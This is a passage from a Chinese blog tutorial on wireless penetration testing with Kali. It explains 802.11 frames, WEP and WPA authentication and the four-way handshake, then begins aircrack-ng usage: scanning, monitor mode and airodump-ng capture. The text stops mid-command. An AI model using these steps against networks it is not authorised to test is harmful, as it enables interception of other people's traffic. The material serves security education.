<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.2.0"><link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="baidu-site-verification" content="EtrqTppKP2zrDi7r"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"uestc-toy.github.io",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:null},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!0,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!0,pangu:!1,comments:{style:"tabs",active:"valine",storage:!0,lazyload:!1,nav:null,activeClass:"valine"},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="常用的WLAN标准如下：802.11 - The original WLAN standard802.11a- Up to 54 Mbit&#x2F;s on 5 GHz802.11b- 5.5 Mbit&#x2F;s and 11 Mbit&#x2F;s on 2.4 GHz802.11g- Up to 54 Mbit&#x2F;s on 2.4 GHz. Backward compatible with 802.11b802.11i"><meta property="og:type" content="article"><meta property="og:title" content="Kali使用教程（二）：无线攻击"><meta property="og:url" content="http://uestc-toy.github.io/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/index.html"><meta property="og:site_name" content="小yi的blog"><meta property="og:description" content="常用的WLAN标准如下：802.11 - The original WLAN standard802.11a- Up to 54 Mbit&#x2F;s on 5 GHz802.11b- 5.5 Mbit&#x2F;s and 11 Mbit&#x2F;s on 2.4 GHz802.11g- Up to 54 Mbit&#x2F;s on 2.4 GHz. Backward compatible with 802.11b802.11i"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200612155352483.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200615174111204.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616110428548.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616111203921.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616112022939.png"><meta property="article:published_time" content="2020-06-24T10:36:36.000Z"><meta property="article:modified_time" content="2020-07-27T01:33:53.529Z"><meta property="article:author" content="tosang"><meta property="article:tag" content="Kali"><meta property="article:tag" content="Linux"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200612155352483.png"><link rel="canonical" href="http://uestc-toy.github.io/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.css"><style>#needsharebutton-postbottom{cursor:pointer;height:26px;margin-top:10px;position:relative}#needsharebutton-postbottom .btn{border:1px solid $btn-default-border-color;border-radius:3px;display:initial;padding:1px 4px}</style><style>#needsharebutton-float{bottom:88px;cursor:pointer;left:-8px;position:fixed;z-index:9999}#needsharebutton-float .btn{border:1px solid $btn-default-border-color;border-radius:4px;padding:0 10px 0 14px}</style><title>Kali使用教程（二）：无线攻击 | 小yi的blog</title><script data-pjax>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?063295f670f17958c713a81e3a2d6844";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">小yi的blog</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">从前很忙</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><a role="button" class="book-mark-link book-mark-link-fixed"></a><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://uestc-toy.github.io/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><meta itemprop="name" content="tosang"><meta itemprop="description" content="blog、记录和分享"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="小yi的blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Kali使用教程（二）：无线攻击</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-06-24 18:36:36" itemprop="dateCreated datePublished" datetime="2020-06-24T18:36:36+08:00">2020-06-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-07-27 09:33:53" itemprop="dateModified" datetime="2020-07-27T09:33:53+08:00">2020-07-27</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a> </span></span><span id="/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/" class="post-meta-item leancloud_visitors" data-flag-title="Kali使用教程（二）：无线攻击" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>8.1k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>7 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p>常用的WLAN标准如下：</p><blockquote><p>802.11 - The original WLAN standard<br>802.11a- Up to 54 Mbit/s on 5 GHz<br>802.11b- 5.5 Mbit/s and 11 Mbit/s on 2.4 GHz<br>802.11g- Up to 54 Mbit/s on 2.4 GHz. Backward compatible with 802.11b<br>802.11i- Provides enhanced security<br>802.11n - Provides higher throughput with Multiple Input/Multiple Output (MIMO)</p></blockquote><a id="more"></a><p>信号干扰问题：</p><blockquote><p>2.4GHz band (2. 4GHz - 2.485GHz)，它拥有11-14个重叠的信道channels，每个信道22MHz带宽，只有三个完全不重叠的信道，所以多个2.4g信号会发送干扰</p></blockquote><p>SSID：</p><blockquote><p>Service Set ldentifier (SSID)<br>AP每秒钟约10次通过Beacon帧广播SSID<br>客户端连接到无线网络后也会宣告SSID</p></blockquote><p>MONITOR MODE</p><blockquote><p>Monitor不是一种真的无线模式，但是对无线渗透至关重要，它允许无线网卡没有任何筛选的抓包(802.11包头)，与有线网络的混杂模式可以类比，适合的网卡和驱动不但可以monitor，更可以Injection</p></blockquote><h3 id="无线网卡配置"><a href="#无线网卡配置" class="headerlink" title="无线网卡配置"></a>无线网卡配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">扫描附近AP：</span><br><span class="line">iw dev wlan2 scan| grep SSID</span><br><span class="line">iw dev wlan2 scan| egrep "DS\ Parameter\ set|SSID"</span><br><span class="line">iwlist wlan2 scanning | egrep "ESSID↓Channel"</span><br><span class="line"></span><br><span class="line">添加删除侦听端口:</span><br><span class="line">iw dev wlan2 interface add wlan2mon type monitor</span><br><span class="line">	tcpdump -S 0 -i wlan2mon -P</span><br><span class="line">iw dev wlan2mon interface del</span><br></pre></td></tr></table></figure><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="DADIOTAP头"><a href="#DADIOTAP头" class="headerlink" title="DADIOTAP头"></a>DADIOTAP头</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">802.1帧发射和接收的事实标准，802.11依赖Radiotap完成通信过程</span><br><span class="line">Linux系统在驱动和API中内建支持Radiotap</span><br><span class="line">802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到</span><br><span class="line">无线帧时，驱动通知MAC层，此帧头包含Radiotap头</span><br><span class="line">Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定</span><br><span class="line">不破坏原始头结构，增加传递的信息</span><br><span class="line"></span><br><span class="line">组成：</span><br><span class="line">分为Header和data</span><br><span class="line">Version (8bit )</span><br><span class="line">	值始终为0</span><br><span class="line">Pad (8bit)</span><br><span class="line">	未使用，只作为字段强制对其的占位;</span><br><span class="line">Length (16bit)</span><br><span class="line">	整个radiotap头长度(可变)，作用是确定802.11头的开始位置</span><br><span class="line">Present (32bit)</span><br><span class="line">	Data段的掩码</span><br><span class="line">	Ext (1、0)</span><br><span class="line">	MAC不能理解的头部直接忽略</span><br></pre></td></tr></table></figure><h4 id="BEACON-FRAMES"><a href="#BEACON-FRAMES" class="headerlink" title="BEACON FRAMES"></a>BEACON FRAMES</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">AP发送的广播帧，通告无线网络的存在(BSSID )</span><br><span class="line">发包频率</span><br><span class="line">	<span class="number">102.4</span>ms (可变)</span><br><span class="line">	时间单位<span class="number">1024</span>ms (<span class="number">60</span>秒)</span><br><span class="line">SSID网络名</span><br><span class="line">	隐藏AP不发SSID广播</span><br><span class="line">IBSSI Status</span><br><span class="line">	<span class="number">0</span>: infrastructure</span><br><span class="line">	<span class="number">1</span>: ad-hoc</span><br><span class="line">Privicy</span><br><span class="line">	WEP、WPA</span><br><span class="line">ESSID</span><br><span class="line">	名称、长度</span><br><span class="line">速率</span><br><span class="line">	<span class="number">802.11</span> g (<span class="number">1</span><span class="number">-54</span>Mbit )</span><br><span class="line">信道</span><br><span class="line">	<span class="number">11</span></span><br></pre></td></tr></table></figure><h4 id="DATA-FRAMES"><a href="#DATA-FRAMES" class="headerlink" title="DATA FRAMES"></a>DATA FRAMES</h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">传输用户数据</span><br><span class="line">	<span class="built_in">DATA</span> Frame</span><br><span class="line">空数据帧</span><br><span class="line">	<span class="built_in">Null</span> <span class="built_in">data</span> frame</span><br><span class="line">	只包含MAC头和FCS</span><br><span class="line">	STA用于声明自己将要进入省电模式</span><br></pre></td></tr></table></figure><h4 id="连接无线网络完整过程"><a href="#连接无线网络完整过程" class="headerlink" title="连接无线网络完整过程"></a>连接无线网络完整过程</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Probe</span><br><span class="line">	STA向所有信道发出probe帧，发现<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>应道Response</span><br><span class="line">Authentication</span><br><span class="line">	STA向<span class="keyword">AP</span>发出验证请求</span><br><span class="line">	发生认证过程(步骤可变)</span><br><span class="line">	<span class="keyword">AP</span>响应STA的认证结果</span><br><span class="line">Association</span><br><span class="line">	STA发出关联请求</span><br><span class="line">	<span class="keyword">AP</span>响应关联请求</span><br><span class="line">	关联成功，开始通信</span><br></pre></td></tr></table></figure><h4 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a>WEP探测过程</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Beacon标识使用WEP加密</span></span><br><span class="line"><span class="keyword">STA发送普通Probe帧</span></span><br><span class="line"><span class="keyword">AP响应Probe </span>Response帧声明其采用WEP加密</span><br></pre></td></tr></table></figure><h4 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a>WPA探测过程</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两个AP的Beacon包内容不同，但都声明采用了WPA加密</span><br><span class="line">不同厂商对<span class="number">802.11</span>标准的实现方式不同</span><br><span class="line">包头包含WPA1字段信息</span><br></pre></td></tr></table></figure><h4 id="WEP-OPEN认证"><a href="#WEP-OPEN认证" class="headerlink" title="WEP OPEN认证"></a>WEP OPEN认证</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WEP Open认证与open认证通信过程相同</span><br><span class="line">正确认证后通信数据被WEP加密</span><br><span class="line">如果认证时客户端输入错误密码</span><br><span class="line">	认证依然可以通过</span><br><span class="line">	AP将丢弃该STA的数据包</span><br><span class="line">		起始向量被错误地密钥解密后完整性被破坏</span><br><span class="line">		但数据传输将失败</span><br><span class="line">认证响应正确，身份验证成功</span><br></pre></td></tr></table></figure><h4 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">STA发认证请求</span><br><span class="line"><span class="keyword">AP</span>返回随机Challenge消息</span><br><span class="line">STA使用PSK加密Cha并发回给<span class="keyword">AP</span></span><br><span class="line"><span class="keyword">AP</span>使用PSK解密密文，获得Cha并与</span><br><span class="line">原始Cha比对，相同则验证成功，</span><br><span class="line">不同则验证失败;</span><br><span class="line"></span><br><span class="line">大部分无线驱动首先尝试<span class="keyword">open</span>验证，如失败则尝试PSK</span><br></pre></td></tr></table></figure><h4 id="加密协议"><a href="#加密协议" class="headerlink" title="加密协议"></a>加密协议</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">无线安全根源</span><br><span class="line">	<span class="number">802.11</span>基于无线电波发射信息</span><br><span class="line">	嗅探侦听是主要问题</span><br><span class="line">	加密机制是必须手段</span><br><span class="line">Wired Equivalent Privacy (WEP)</span><br><span class="line">	<span class="number">802.11</span>标准的一部分</span><br><span class="line">	发布后不久被发现存在安全漏洞</span><br><span class="line">WI-Fi Protected Access (WPA)取代WEP</span><br><span class="line">	WPA2 (<span class="number">802.11</span>i标准)</span><br></pre></td></tr></table></figure><h4 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a>OPEN无加密网络</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无任何加密机制</span><br><span class="line">所有数据都可以被嗅探</span><br><span class="line">STA和<span class="keyword">AP</span>只协商拼配参数即可连入网络</span><br></pre></td></tr></table></figure><h3 id="WEP加密算法"><a href="#WEP加密算法" class="headerlink" title="WEP加密算法"></a>WEP加密算法</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用Rivest Cipher <span class="number">4</span> (RC4)算法加密流量内容，实现机密性</span><br><span class="line">CRC32算法检查数据完整性</span><br><span class="line">标准采用使用<span class="number">24</span>位initialization <span class="type">vector</span> (IV)</span><br><span class="line">受美国加密技术出C限制法律的要求：</span><br><span class="line">	高于<span class="number">64</span>bit <span class="type">key</span>禁止出口</span><br><span class="line">	所以除<span class="number">24</span>bit IV之外真实的<span class="type">key</span>只有<span class="number">40</span>bit的版本被允许出口</span><br><span class="line">	出口限制法律撤销后实现了<span class="number">128</span>bit <span class="type">key</span>的WEP版本(使用相同的<span class="number">24</span>bit IV)</span><br></pre></td></tr></table></figure><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RSA实验室研发的对称加密-流算法：</span><br><span class="line">	实现简单</span><br><span class="line">	速度快</span><br><span class="line">	</span><br><span class="line">加密:对明文流和密钥流进行<span class="keyword">XOR</span>计算</span><br><span class="line">解密:对密文流和密钥流进行<span class="keyword">XOR</span>计算</span><br><span class="line">RC4算法<span class="built_in">key</span>由两个过程生成：</span><br><span class="line">	合并IV（起始向量）和PSK（共享密钥），利用<span class="built_in">Key</span> Scheduling <span class="built_in">Algorithm</span> (KSA)算法生成起始状态表</span><br><span class="line">	Pseudo -Random Generation <span class="built_in">Algorithm</span> (PRGA)算法生成最终密钥流</span><br></pre></td></tr></table></figure><h3 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Wi-Fi <span class="keyword">Protected</span> <span class="keyword">Access</span></span><br><span class="line"><span class="number">802.11</span>i组为提高无线安全，开发两个新的链路层加密协议</span><br><span class="line">	Temporal Key Integrity Protocol (TKIP)</span><br><span class="line">		WPA1 (较之WEP可动态改变密钥)</span><br><span class="line">	Counter Mode <span class="keyword">with</span> CBC-MAC (CCMP)</span><br><span class="line">		WPA2</span><br><span class="line">WPA加密两种安全类型</span><br><span class="line">	WPA个人:使用预设共享密钥实现身份验证</span><br><span class="line">	WPA企业:使用<span class="number">802</span>. <span class="number">1</span>X和Radius服务器实现AAA</span><br></pre></td></tr></table></figure><h4 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a>WPA1</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">802.11</span>i第三版草案</span><br><span class="line">与WEP比较：</span><br><span class="line">	都采用逐包进行密钥加密</span><br><span class="line">	<span class="number">128</span>位的<span class="type">key</span>和<span class="number">48</span>位的初向量(IV)</span><br><span class="line">	RC4流加密数据</span><br><span class="line">	帧计数器避免重放攻击</span><br><span class="line">	TKIP使用Michael算法进行完整性校验(MIC )</span><br><span class="line">		WEP CRC32</span><br><span class="line">	兼容早期版本硬件</span><br></pre></td></tr></table></figure><h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">依据802.11i完全重新设计实现</span><br><span class="line">	也被称为Robust Security<span class="built_in"> Network </span>(RSN)</span><br><span class="line">	CCMP替代TKIP</span><br><span class="line">	AES加密算法取代了RC4</span><br><span class="line">	不兼容早期版本硬件</span><br></pre></td></tr></table></figure><h4 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a>WPA企业连接过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">协商安全协议</span><br><span class="line">身份认证</span><br><span class="line">密钥分发和验证</span><br><span class="line">数据加密完整性</span><br></pre></td></tr></table></figure><h4 id="WPA-PSK"><a href="#WPA-PSK" class="headerlink" title="WPA-PSK"></a>WPA-PSK</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">协商安全协议</span><br><span class="line">密钥分发和验证</span><br><span class="line">数据加密完整性</span><br></pre></td></tr></table></figure><h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WPA四步握手过程生成PTK：</span><br><span class="line">	<span class="keyword">AP</span>发送Anonce给STA</span><br><span class="line">	STA生成Snonce计算出PTK</span><br><span class="line">	Snonce加PTK的MIC发给<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>拿到Snonce计算出PTK</span><br><span class="line">	<span class="keyword">AP</span>计算MIC与接收的MIC比对</span><br><span class="line">	MIC一致说明确定STA知道PMK</span><br><span class="line">	<span class="keyword">AP</span>发GTK给STA</span><br><span class="line">	STA回复ACK并使用密钥加密</span><br></pre></td></tr></table></figure><h3 id="无线渗透测试"><a href="#无线渗透测试" class="headerlink" title="无线渗透测试"></a>无线渗透测试</h3><h4 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a>AIRCRACK-NG基础</h4><blockquote><p>无线渗透和审计神器，包含各种功能的工具套件，支持：<br>网络检测<br>嗅探抓包<br>包注入<br>密码破解</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng check #检测是否存在冲突</span><br><span class="line">airmon check kill #杀掉冲突进程</span><br><span class="line"></span><br><span class="line">airmon start wlan2 3  #开启网卡监听模式，工作在3信道</span><br><span class="line">iwlist wlan2mon channel #查看工作信道</span><br><span class="line">airmon stop wlan2mon #关闭监听监听模式</span><br></pre></td></tr></table></figure><h4 id="AIRODUMP-NG"><a href="#AIRODUMP-NG" class="headerlink" title="AIRODUMP-NG"></a>AIRODUMP-NG</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">无线抓包</span><br><span class="line">airodump-ng wlan2mon 